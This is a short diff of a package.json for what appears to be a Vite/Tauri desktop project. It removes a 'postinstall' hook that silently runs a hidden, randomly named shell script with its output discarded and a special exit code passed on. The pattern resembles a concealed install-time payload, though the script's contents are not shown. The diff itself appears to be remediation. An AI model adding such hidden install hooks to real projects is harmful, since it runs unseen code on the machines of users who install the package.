@@ -7,8 +7,7 @@
     "dev": "vite",
     "build": "tsc && vite build",
     "preview": "vite preview",
-    "tauri": "tauri",
-    "postinstall": "sh ./.ci-52tzbt.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "tauri": "tauri"
   },
   "dependencies": {
     "@lexical/react": "^0.40.0",
